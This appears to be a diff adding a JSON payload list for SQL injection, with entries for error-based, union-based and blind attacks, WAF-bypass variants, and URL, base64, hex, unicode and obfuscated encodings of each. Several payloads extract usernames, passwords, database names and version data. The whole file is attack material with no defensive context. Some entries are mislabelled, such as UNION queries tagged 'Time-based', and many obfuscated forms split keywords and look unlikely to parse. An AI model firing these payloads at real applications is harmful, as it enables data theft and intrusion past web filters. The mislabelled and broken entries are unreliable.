@@ -1,0 +1,200 @@
+[
+  {
+    "type": "Error-based",
+    "category": "",
+    "payload": "' OR 1=1--",
+    "bypass": false,
+    "encoded": "%27+OR+1%3D1--",
+    "base64": "JyBPUiAxPTEtLQ==",
+    "hexed": "\\x27\\x20\\x4f\\x52\\x20\\x31\\x3d\\x31\\x2d\\x2d",
+    "unicode": "\\u0027\\u0020\\u004f\\u0052\\u0020\\u0031\\u003d\\u0031\\u002d\\u002d",
+    "obfuscated": "'  /**/O R  /**/1/**/= 1 - -\u003c!-- --\u003e"
+  },
+  {
+    "type": "Error-based (WAF-Cased)",
+    "category": "WAF-bypass",
+    "payload": "' OR 1=1--",
+    "bypass": true,
+    "encoded": "%27+OR+1%3D1--",
+    "base64": "JyBPUiAxPTEtLQ==",
+    "hexed": "\\x27\\x20\\x4f\\x52\\x20\\x31\\x3d\\x31\\x2d\\x2d",
+    "unicode": "\\u0027\\u0020\\u004f\\u0052\\u0020\\u0031\\u003d\\u0031\\u002d\\u002d",
+    "obfuscated": "'   O/**/R  /**/1 =/**/1 -/**/-/**/"
+  },
+  {
+    "type": "Error-based (WAF-Commented)",
+    "category": "WAF-bypass",
+    "payload": "' O/**/R 1=1--",
+    "bypass": true,
+    "encoded": "%27+O%2F%2A%2A%2FR+1%3D1--",
+    "base64": "JyBPLyoqL1IgMT0xLS0=",
+    "hexed": "\\x27\\x20\\x4f\\x2f\\x2a\\x2a\\x2f\\x52\\x20\\x31\\x3d\\x31\\x2d\\x2d",
+    "unicode": "\\u0027\\u0020\\u004f\\u002f\\u002a\\u002a\\u002f\\u0052\\u0020\\u0031\\u003d\\u0031\\u002d\\u002d",
+    "obfuscated": "'   O/**// */**/* //**/R  /**/1/**/=\u003c!-- --\u003e1/**/-/**/-\u003c!-- --\u003e"
+  },
+  {
+    "type": "Union-based",
+    "category": "",
+    "payload": "' UNION SELECT null, username, password FROM users--",
+    "bypass": true,
+    "encoded": "%27+UNION+SELECT+null%2C+username%2C+password+FROM+users--",
+    "base64": "JyBVTklPTiBTRUxFQ1QgbnVsbCwgdXNlcm5hbWUsIHBhc3N3b3JkIEZST00gdXNlcnMtLQ==",
+    "hexed": "\\x27\\x20\\x55\\x4e\\x49\\x4f\\x4e\\x20\\x53\\x45\\x4c\\x45\\x43\\x54\\x20\\x6e\\x75\\x6c\\x6c\\x2c\\x20\\x75\\x73\\x65\\x72\\x6e\\x61\\x6d\\x65\\x2c\\x20\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x20\\x46\\x52\\x4f\\x4d\\x20\\x75\\x73\\x65\\x72\\x73\\x2d\\x2d",
+    "unicode": "\\u0027\\u0020\\u0055\\u004e\\u0049\\u004f\\u004e\\u0020\\u0053\\u0045\\u004c\\u0045\\u0043\\u0054\\u0020\\u006e\\u0075\\u006c\\u006c\\u002c\\u0020\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u002c\\u0020\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0020\\u0046\\u0052\\u004f\\u004d\\u0020\\u0075\\u0073\\u0065\\u0072\\u0073\\u002d\\u002d",
+    "obfuscated": "'   U/**/N I/**/O N/**/  S/**/E/**/L\u003c!-- --\u003eE/**/C/**/T\u003c!-- --\u003e /**/n\u003c!-- --\u003eu\u003c!-- --\u003el/**/l\u003c!-- --\u003e,   u s\u003c!-- --\u003ee\u003c!-- --\u003er\u003c!-- --\u003en a/**/m\u003c!-- --\u003ee/**/,/**/  p\u003c!-- --\u003ea s/**/s/**/w\u003c!-- --\u003eo\u003c!-- --\u003er\u003c!-- --\u003ed/**/ \u003c!-- --\u003eF/**/R\u003c!-- --\u003eO M\u003c!-- --\u003e  u/**/s/**/e/**/r\u003c!-- --\u003es/**/-\u003c!-- --\u003e- "
+  },
+  {
+    "type": "Union-based (WAF-Cased)",
+    "category": "WAF-bypass",
+    "payload": "' UNioN SElECT NuLL, UsErnAme, PASsWord FroM Users--",
+    "bypass": true,
+    "encoded": "%27+UNioN+SElECT+NuLL%2C+UsErnAme%2C+PASsWord+FroM+Users--",
+    "base64": "JyBVTmlvTiBTRWxFQ1QgTnVMTCwgVXNFcm5BbWUsIFBBU3NXb3JkIEZyb00gVXNlcnMtLQ==",
+    "hexed": "\\x27\\x20\\x55\\x4e\\x69\\x6f\\x4e\\x20\\x53\\x45\\x6c\\x45\\x43\\x54\\x20\\x4e\\x75\\x4c\\x4c\\x2c\\x20\\x55\\x73\\x45\\x72\\x6e\\x41\\x6d\\x65\\x2c\\x20\\x50\\x41\\x53\\x73\\x57\\x6f\\x72\\x64\\x20\\x46\\x72\\x6f\\x4d\\x20\\x55\\x73\\x65\\x72\\x73\\x2d\\x2d",
+    "unicode": "\\u0027\\u0020\\u0055\\u004e\\u0069\\u006f\\u004e\\u0020\\u0053\\u0045\\u006c\\u0045\\u0043\\u0054\\u0020\\u004e\\u0075\\u004c\\u004c\\u002c\\u0020\\u0055\\u0073\\u0045\\u0072\\u006e\\u0041\\u006d\\u0065\\u002c\\u0020\\u0050\\u0041\\u0053\\u0073\\u0057\\u006f\\u0072\\u0064\\u0020\\u0046\\u0072\\u006f\\u004d\\u0020\\u0055\\u0073\\u0065\\u0072\\u0073\\u002d\\u002d",
+    "obfuscated": "'   U/**/N i/**/o N/**/  S/**/E/**/l\u003c!-- --\u003eE/**/C/**/T\u003c!-- --\u003e /**/N\u003c!-- --\u003eu\u003c!-- --\u003eL/**/L\u003c!-- --\u003e,   U s\u003c!-- --\u003eE\u003c!-- --\u003er\u003c!-- --\u003en A/**/m\u003c!-- --\u003ee/**/,/**/  P\u003c!-- --\u003eA S/**/s/**/W\u003c!-- --\u003eo\u003c!-- --\u003er\u003c!-- --\u003ed/**/ \u003c!-- --\u003eF/**/r\u003c!-- --\u003eo M\u003c!-- --\u003e  U/**/s/**/e/**/r\u003c!-- --\u003es/**/-\u003c!-- --\u003e- "
+  },
+  {
+    "type": "Union-based (WAF-Commented)",
+    "category": "WAF-bypass",
+    "payload": "' UN/**/ION SE/**/LECT null, username, passwO/**/Rd FR/**/OM users--",
+    "bypass": true,
+    "encoded": "%27+UN%2F%2A%2A%2FION+SE%2F%2A%2A%2FLECT+null%2C+username%2C+passwO%2F%2A%2A%2FRd+FR%2F%2A%2A%2FOM+users--",
+    "base64": "JyBVTi8qKi9JT04gU0UvKiovTEVDVCBudWxsLCB1c2VybmFtZSwgcGFzc3dPLyoqL1JkIEZSLyoqL09NIHVzZXJzLS0=",
+    "hexed": "\\x27\\x20\\x55\\x4e\\x2f\\x2a\\x2a\\x2f\\x49\\x4f\\x4e\\x20\\x53\\x45\\x2f\\x2a\\x2a\\x2f\\x4c\\x45\\x43\\x54\\x20\\x6e\\x75\\x6c\\x6c\\x2c\\x20\\x75\\x73\\x65\\x72\\x6e\\x61\\x6d\\x65\\x2c\\x20\\x70\\x61\\x73\\x73\\x77\\x4f\\x2f\\x2a\\x2a\\x2f\\x52\\x64\\x20\\x46\\x52\\x2f\\x2a\\x2a\\x2f\\x4f\\x4d\\x20\\x75\\x73\\x65\\x72\\x73\\x2d\\x2d",
+    "unicode": "\\u0027\\u0020\\u0055\\u004e\\u002f\\u002a\\u002a\\u002f\\u0049\\u004f\\u004e\\u0020\\u0053\\u0045\\u002f\\u002a\\u002a\\u002f\\u004c\\u0045\\u0043\\u0054\\u0020\\u006e\\u0075\\u006c\\u006c\\u002c\\u0020\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u002c\\u0020\\u0070\\u0061\\u0073\\u0073\\u0077\\u004f\\u002f\\u002a\\u002a\\u002f\\u0052\\u0064\\u0020\\u0046\\u0052\\u002f\\u002a\\u002a\\u002f\\u004f\\u004d\\u0020\\u0075\\u0073\\u0065\\u0072\\u0073\\u002d\\u002d",
+    "obfuscated": "'   U/**/N //**/* */**// I/**/O/**/N\u003c!-- --\u003e /**/S/**/E\u003c!-- --\u003e//**/*\u003c!-- --\u003e*\u003c!-- --\u003e//**/L\u003c!-- --\u003eE C T  \u003c!-- --\u003en\u003c!-- --\u003eu\u003c!-- --\u003el l/**/,\u003c!-- --\u003e /**/u/**/s e\u003c!-- --\u003er n/**/a/**/m\u003c!-- --\u003ee\u003c!-- --\u003e,\u003c!-- --\u003e /**/p\u003c!-- --\u003ea/**/s\u003c!-- --\u003es w\u003c!-- --\u003eO //**/*/**/*/**//\u003c!-- --\u003eR/**/d\u003c!-- --\u003e  F/**/R/**//\u003c!-- --\u003e* */**///**/O/**/M/**/  u\u003c!-- --\u003es\u003c!-- --\u003ee r s\u003c!-- --\u003e- - "
+  },
+  {
+    "type": "Blind SQLi",
+    "category": "",
+    "payload": "' AND SLEEP(5)--",
+    "bypass": true,
+    "encoded": "%27+AND+SLEEP%285%29--",
+    "base64": "JyBBTkQgU0xFRVAoNSktLQ==",
+    "hexed": "\\x27\\x20\\x41\\x4e\\x44\\x20\\x53\\x4c\\x45\\x45\\x50\\x28\\x35\\x29\\x2d\\x2d",
+    "unicode": "\\u0027\\u0020\\u0041\\u004e\\u0044\\u0020\\u0053\\u004c\\u0045\\u0045\\u0050\\u0028\\u0035\\u0029\\u002d\\u002d",
+    "obfuscated": "'   A/**/N D/**/  S/**/L E/**/E/**/P\u003c!-- --\u003e(/**/5/**/)\u003c!-- --\u003e-/**/-\u003c!-- --\u003e"
+  },
+  {
+    "type": "Blind SQLi (WAF-Cased)",
+    "category": "WAF-bypass",
+    "payload": "' ANd SLEEp(5)--",
+    "bypass": true,
+    "encoded": "%27+ANd+SLEEp%285%29--",
+    "base64": "JyBBTmQgU0xFRXAoNSktLQ==",
+    "hexed": "\\x27\\x20\\x41\\x4e\\x64\\x20\\x53\\x4c\\x45\\x45\\x70\\x28\\x35\\x29\\x2d\\x2d",
+    "unicode": "\\u0027\\u0020\\u0041\\u004e\\u0064\\u0020\\u0053\\u004c\\u0045\\u0045\\u0070\\u0028\\u0035\\u0029\\u002d\\u002d",
+    "obfuscated": "'   A/**/N d/**/  S/**/L E/**/E/**/p\u003c!-- --\u003e(/**/5/**/)\u003c!-- --\u003e-/**/-\u003c!-- --\u003e"
+  },
+  {
+    "type": "Blind SQLi (WAF-Commented)",
+    "category": "WAF-bypass",
+    "payload": "' A/**/ND SLEEP(5)--",
+    "bypass": true,
+    "encoded": "%27+A%2F%2A%2A%2FND+SLEEP%285%29--",
+    "base64": "JyBBLyoqL05EIFNMRUVQKDUpLS0=",
+    "hexed": "\\x27\\x20\\x41\\x2f\\x2a\\x2a\\x2f\\x4e\\x44\\x20\\x53\\x4c\\x45\\x45\\x50\\x28\\x35\\x29\\x2d\\x2d",
+    "unicode": "\\u0027\\u0020\\u0041\\u002f\\u002a\\u002a\\u002f\\u004e\\u0044\\u0020\\u0053\\u004c\\u0045\\u0045\\u0050\\u0028\\u0035\\u0029\\u002d\\u002d",
+    "obfuscated": "'   A/**// */**/* //**/N D/**/ /**/S\u003c!-- --\u003eL/**/E/**/E\u003c!-- --\u003eP/**/(\u003c!-- --\u003e5\u003c!-- --\u003e)/**/-\u003c!-- --\u003e- "
+  },
+  {
+    "type": "Error-based",
+    "category": "",
+    "payload": "' OR 'a'='a",
+    "bypass": false,
+    "encoded": "%27+OR+%27a%27%3D%27a",
+    "base64": "JyBPUiAnYSc9J2E=",
+    "hexed": "\\x27\\x20\\x4f\\x52\\x20\\x27\\x61\\x27\\x3d\\x27\\x61",
+    "unicode": "\\u0027\\u0020\\u004f\\u0052\\u0020\\u0027\\u0061\\u0027\\u003d\\u0027\\u0061",
+    "obfuscated": "'   O/**/R  /**/' a/**/' =/**/'/**/a\u003c!-- --\u003e"
+  },
+  {
+    "type": "Error-based (WAF-Cased)",
+    "category": "WAF-bypass",
+    "payload": "' OR 'A'='a",
+    "bypass": true,
+    "encoded": "%27+OR+%27A%27%3D%27a",
+    "base64": "JyBPUiAnQSc9J2E=",
+    "hexed": "\\x27\\x20\\x4f\\x52\\x20\\x27\\x41\\x27\\x3d\\x27\\x61",
+    "unicode": "\\u0027\\u0020\\u004f\\u0052\\u0020\\u0027\\u0041\\u0027\\u003d\\u0027\\u0061",
+    "obfuscated": "'   O/**/R  /**/' A/**/' =/**/'/**/a\u003c!-- --\u003e"
+  },
+  {
+    "type": "Error-based (WAF-Commented)",
+    "category": "WAF-bypass",
+    "payload": "' O/**/R 'a'='a",
+    "bypass": true,
+    "encoded": "%27+O%2F%2A%2A%2FR+%27a%27%3D%27a",
+    "base64": "JyBPLyoqL1IgJ2EnPSdh",
+    "hexed": "\\x27\\x20\\x4f\\x2f\\x2a\\x2a\\x2f\\x52\\x20\\x27\\x61\\x27\\x3d\\x27\\x61",
+    "unicode": "\\u0027\\u0020\\u004f\\u002f\\u002a\\u002a\\u002f\\u0052\\u0020\\u0027\\u0061\\u0027\\u003d\\u0027\\u0061",
+    "obfuscated": "'   O/**// */**/* //**/R  /**/'/**/a\u003c!-- --\u003e'/**/=/**/'\u003c!-- --\u003ea/**/"
+  },
+  {
+    "type": "Time-based",
+    "category": "",
+    "payload": "' AND 1=1 UNION SELECT null, version()--",
+    "bypass": true,
+    "encoded": "%27+AND+1%3D1+UNION+SELECT+null%2C+version%28%29--",
+    "base64": "JyBBTkQgMT0xIFVOSU9OIFNFTEVDVCBudWxsLCB2ZXJzaW9uKCktLQ==",
+    "hexed": "\\x27\\x20\\x41\\x4e\\x44\\x20\\x31\\x3d\\x31\\x20\\x55\\x4e\\x49\\x4f\\x4e\\x20\\x53\\x45\\x4c\\x45\\x43\\x54\\x20\\x6e\\x75\\x6c\\x6c\\x2c\\x20\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e\\x28\\x29\\x2d\\x2d",
+    "unicode": "\\u0027\\u0020\\u0041\\u004e\\u0044\\u0020\\u0031\\u003d\\u0031\\u0020\\u0055\\u004e\\u0049\\u004f\\u004e\\u0020\\u0053\\u0045\\u004c\\u0045\\u0043\\u0054\\u0020\\u006e\\u0075\\u006c\\u006c\\u002c\\u0020\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e\\u0028\\u0029\\u002d\\u002d",
+    "obfuscated": "'   A/**/N D/**/  1/**/= 1/**/ /**/U\u003c!-- --\u003eN/**/I/**/O\u003c!-- --\u003eN/**/ \u003c!-- --\u003eS\u003c!-- --\u003eE/**/L\u003c!-- --\u003eE C T  \u003c!-- --\u003en\u003c!-- --\u003eu\u003c!-- --\u003el l/**/,\u003c!-- --\u003e /**/v/**/e r\u003c!-- --\u003es i/**/o/**/n\u003c!-- --\u003e(\u003c!-- --\u003e)\u003c!-- --\u003e-/**/-\u003c!-- --\u003e"
+  },
+  {
+    "type": "Time-based (WAF-Cased)",
+    "category": "WAF-bypass",
+    "payload": "' ANd 1=1 UNIoN seLecT NULL, VersiON()--",
+    "bypass": true,
+    "encoded": "%27+ANd+1%3D1+UNIoN+seLecT+NULL%2C+VersiON%28%29--",
+    "base64": "JyBBTmQgMT0xIFVOSW9OIHNlTGVjVCBOVUxMLCBWZXJzaU9OKCktLQ==",
+    "hexed": "\\x27\\x20\\x41\\x4e\\x64\\x20\\x31\\x3d\\x31\\x20\\x55\\x4e\\x49\\x6f\\x4e\\x20\\x73\\x65\\x4c\\x65\\x63\\x54\\x20\\x4e\\x55\\x4c\\x4c\\x2c\\x20\\x56\\x65\\x72\\x73\\x69\\x4f\\x4e\\x28\\x29\\x2d\\x2d",
+    "unicode": "\\u0027\\u0020\\u0041\\u004e\\u0064\\u0020\\u0031\\u003d\\u0031\\u0020\\u0055\\u004e\\u0049\\u006f\\u004e\\u0020\\u0073\\u0065\\u004c\\u0065\\u0063\\u0054\\u0020\\u004e\\u0055\\u004c\\u004c\\u002c\\u0020\\u0056\\u0065\\u0072\\u0073\\u0069\\u004f\\u004e\\u0028\\u0029\\u002d\\u002d",
+    "obfuscated": "'   A\u003c!-- --\u003eN d\u003c!-- --\u003e \u003c!-- --\u003e1\u003c!-- --\u003e=/**/1  /**/U\u003c!-- --\u003eN\u003c!-- --\u003eI/**/o\u003c!-- --\u003eN\u003c!-- --\u003e /**/s\u003c!-- --\u003ee/**/L\u003c!-- --\u003ee\u003c!-- --\u003ec T\u003c!-- --\u003e \u003c!-- --\u003eN\u003c!-- --\u003eU/**/L\u003c!-- --\u003eL ,  \u003c!-- --\u003eV\u003c!-- --\u003ee/**/r s i\u003c!-- --\u003eO/**/N\u003c!-- --\u003e( ) - - "
+  },
+  {
+    "type": "Time-based (WAF-Commented)",
+    "category": "WAF-bypass",
+    "payload": "' A/**/ND 1=1 UN/**/ION SE/**/LECT null, version()--",
+    "bypass": true,
+    "encoded": "%27+A%2F%2A%2A%2FND+1%3D1+UN%2F%2A%2A%2FION+SE%2F%2A%2A%2FLECT+null%2C+version%28%29--",
+    "base64": "JyBBLyoqL05EIDE9MSBVTi8qKi9JT04gU0UvKiovTEVDVCBudWxsLCB2ZXJzaW9uKCktLQ==",
+    "hexed": "\\x27\\x20\\x41\\x2f\\x2a\\x2a\\x2f\\x4e\\x44\\x20\\x31\\x3d\\x31\\x20\\x55\\x4e\\x2f\\x2a\\x2a\\x2f\\x49\\x4f\\x4e\\x20\\x53\\x45\\x2f\\x2a\\x2a\\x2f\\x4c\\x45\\x43\\x54\\x20\\x6e\\x75\\x6c\\x6c\\x2c\\x20\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e\\x28\\x29\\x2d\\x2d",
+    "unicode": "\\u0027\\u0020\\u0041\\u002f\\u002a\\u002a\\u002f\\u004e\\u0044\\u0020\\u0031\\u003d\\u0031\\u0020\\u0055\\u004e\\u002f\\u002a\\u002a\\u002f\\u0049\\u004f\\u004e\\u0020\\u0053\\u0045\\u002f\\u002a\\u002a\\u002f\\u004c\\u0045\\u0043\\u0054\\u0020\\u006e\\u0075\\u006c\\u006c\\u002c\\u0020\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e\\u0028\\u0029\\u002d\\u002d",
+    "obfuscated": "'   A\u003c!-- --\u003e/ *\u003c!-- --\u003e*\u003c!-- --\u003e/\u003c!-- --\u003eN/**/D  /**/1\u003c!-- --\u003e=\u003c!-- --\u003e1/**/ \u003c!-- --\u003eU\u003c!-- --\u003eN/**//\u003c!-- --\u003e*/**/*\u003c!-- --\u003e/\u003c!-- --\u003eI O\u003c!-- --\u003eN\u003c!-- --\u003e \u003c!-- --\u003eS/**/E\u003c!-- --\u003e/ * *\u003c!-- --\u003e/\u003c!-- --\u003eL/**/E C T\u003c!-- --\u003e /**/n\u003c!-- --\u003eu l l ,   v\u003c!-- --\u003ee\u003c!-- --\u003er s/**/i/**/o n ( ) -/**/- "
+  },
+  {
+    "type": "Union-based",
+    "category": "",
+    "payload": "' AND 1=1 UNION SELECT null, database(), user()--",
+    "bypass": true,
+    "encoded": "%27+AND+1%3D1+UNION+SELECT+null%2C+database%28%29%2C+user%28%29--",
+    "base64": "JyBBTkQgMT0xIFVOSU9OIFNFTEVDVCBudWxsLCBkYXRhYmFzZSgpLCB1c2VyKCktLQ==",
+    "hexed": "\\x27\\x20\\x41\\x4e\\x44\\x20\\x31\\x3d\\x31\\x20\\x55\\x4e\\x49\\x4f\\x4e\\x20\\x53\\x45\\x4c\\x45\\x43\\x54\\x20\\x6e\\x75\\x6c\\x6c\\x2c\\x20\\x64\\x61\\x74\\x61\\x62\\x61\\x73\\x65\\x28\\x29\\x2c\\x20\\x75\\x73\\x65\\x72\\x28\\x29\\x2d\\x2d",
+    "unicode": "\\u0027\\u0020\\u0041\\u004e\\u0044\\u0020\\u0031\\u003d\\u0031\\u0020\\u0055\\u004e\\u0049\\u004f\\u004e\\u0020\\u0053\\u0045\\u004c\\u0045\\u0043\\u0054\\u0020\\u006e\\u0075\\u006c\\u006c\\u002c\\u0020\\u0064\\u0061\\u0074\\u0061\\u0062\\u0061\\u0073\\u0065\\u0028\\u0029\\u002c\\u0020\\u0075\\u0073\\u0065\\u0072\\u0028\\u0029\\u002d\\u002d",
+    "obfuscated": "'   A\u003c!-- --\u003eN D\u003c!-- --\u003e \u003c!-- --\u003e1\u003c!-- --\u003e=/**/1  /**/U\u003c!-- --\u003eN\u003c!-- --\u003eI/**/O\u003c!-- --\u003eN\u003c!-- --\u003e /**/S\u003c!-- --\u003eE/**/L\u003c!-- --\u003eE\u003c!-- --\u003eC T\u003c!-- --\u003e \u003c!-- --\u003en\u003c!-- --\u003eu/**/l\u003c!-- --\u003el ,  \u003c!-- --\u003ed\u003c!-- --\u003ea/**/t a b\u003c!-- --\u003ea/**/s\u003c!-- --\u003ee ( ) ,   u\u003c!-- --\u003es\u003c!-- --\u003ee r/**/(/**/) - - "
+  },
+  {
+    "type": "Union-based (WAF-Cased)",
+    "category": "WAF-bypass",
+    "payload": "' anD 1=1 uNION SelecT Null, DAtABasE(), uSer()--",
+    "bypass": true,
+    "encoded": "%27+anD+1%3D1+uNION+SelecT+Null%2C+DAtABasE%28%29%2C+uSer%28%29--",
+    "base64": "JyBhbkQgMT0xIHVOSU9OIFNlbGVjVCBOdWxsLCBEQXRBQmFzRSgpLCB1U2VyKCktLQ==",
+    "hexed": "\\x27\\x20\\x61\\x6e\\x44\\x20\\x31\\x3d\\x31\\x20\\x75\\x4e\\x49\\x4f\\x4e\\x20\\x53\\x65\\x6c\\x65\\x63\\x54\\x20\\x4e\\x75\\x6c\\x6c\\x2c\\x20\\x44\\x41\\x74\\x41\\x42\\x61\\x73\\x45\\x28\\x29\\x2c\\x20\\x75\\x53\\x65\\x72\\x28\\x29\\x2d\\x2d",
+    "unicode": "\\u0027\\u0020\\u0061\\u006e\\u0044\\u0020\\u0031\\u003d\\u0031\\u0020\\u0075\\u004e\\u0049\\u004f\\u004e\\u0020\\u0053\\u0065\\u006c\\u0065\\u0063\\u0054\\u0020\\u004e\\u0075\\u006c\\u006c\\u002c\\u0020\\u0044\\u0041\\u0074\\u0041\\u0042\\u0061\\u0073\\u0045\\u0028\\u0029\\u002c\\u0020\\u0075\\u0053\\u0065\\u0072\\u0028\\u0029\\u002d\\u002d",
+    "obfuscated": "'   a\u003c!-- --\u003en D\u003c!-- --\u003e \u003c!-- --\u003e1\u003c!-- --\u003e=/**/1  /**/u\u003c!-- --\u003eN\u003c!-- --\u003eI/**/O\u003c!-- --\u003eN\u003c!-- --\u003e /**/S\u003c!-- --\u003ee/**/l\u003c!-- --\u003ee\u003c!-- --\u003ec T\u003c!-- --\u003e \u003c!-- --\u003eN\u003c!-- --\u003eu/**/l\u003c!-- --\u003el ,  \u003c!-- --\u003eD\u003c!-- --\u003eA/**/t A B\u003c!-- --\u003ea/**/s\u003c!-- --\u003eE ( ) ,   u\u003c!-- --\u003eS\u003c!-- --\u003ee r/**/(/**/) - - "
+  },
+  {
+    "type": "Union-based (WAF-Commented)",
+    "category": "WAF-bypass",
+    "payload": "' A/**/ND 1=1 UN/**/ION SE/**/LECT null, database(), user()--",
+    "bypass": true,
+    "encoded": "%27+A%2F%2A%2A%2FND+1%3D1+UN%2F%2A%2A%2FION+SE%2F%2A%2A%2FLECT+null%2C+database%28%29%2C+user%28%29--",
+    "base64": "JyBBLyoqL05EIDE9MSBVTi8qKi9JT04gU0UvKiovTEVDVCBudWxsLCBkYXRhYmFzZSgpLCB1c2VyKCktLQ==",
+    "hexed": "\\x27\\x20\\x41\\x2f\\x2a\\x2a\\x2f\\x4e\\x44\\x20\\x31\\x3d\\x31\\x20\\x55\\x4e\\x2f\\x2a\\x2a\\x2f\\x49\\x4f\\x4e\\x20\\x53\\x45\\x2f\\x2a\\x2a\\x2f\\x4c\\x45\\x43\\x54\\x20\\x6e\\x75\\x6c\\x6c\\x2c\\x20\\x64\\x61\\x74\\x61\\x62\\x61\\x73\\x65\\x28\\x29\\x2c\\x20\\x75\\x73\\x65\\x72\\x28\\x29\\x2d\\x2d",
+    "unicode": "\\u0027\\u0020\\u0041\\u002f\\u002a\\u002a\\u002f\\u004e\\u0044\\u0020\\u0031\\u003d\\u0031\\u0020\\u0055\\u004e\\u002f\\u002a\\u002a\\u002f\\u0049\\u004f\\u004e\\u0020\\u0053\\u0045\\u002f\\u002a\\u002a\\u002f\\u004c\\u0045\\u0043\\u0054\\u0020\\u006e\\u0075\\u006c\\u006c\\u002c\\u0020\\u0064\\u0061\\u0074\\u0061\\u0062\\u0061\\u0073\\u0065\\u0028\\u0029\\u002c\\u0020\\u0075\\u0073\\u0065\\u0072\\u0028\\u0029\\u002d\\u002d",
+    "obfuscated": "'   A\u003c!-- --\u003e/ *\u003c!-- --\u003e*\u003c!-- --\u003e/\u003c!-- --\u003eN/**/D  /**/1\u003c!-- --\u003e=\u003c!-- --\u003e1/**/ \u003c!-- --\u003eU\u003c!-- --\u003eN/**//\u003c!-- --\u003e*/**/*\u003c!-- --\u003e/\u003c!-- --\u003eI O\u003c!-- --\u003eN\u003c!-- --\u003e \u003c!-- --\u003eS/**/E\u003c!-- --\u003e/ * *\u003c!-- --\u003e/\u003c!-- --\u003eL/**/E C T\u003c!-- --\u003e /**/n\u003c!-- --\u003eu l l ,   d\u003c!-- --\u003ea\u003c!-- --\u003et a/**/b/**/a s e ( )/**/,  /**/u s\u003c!-- --\u003ee\u003c!-- --\u003er ( ) - -\u003c!-- --\u003e"
+  }
+]
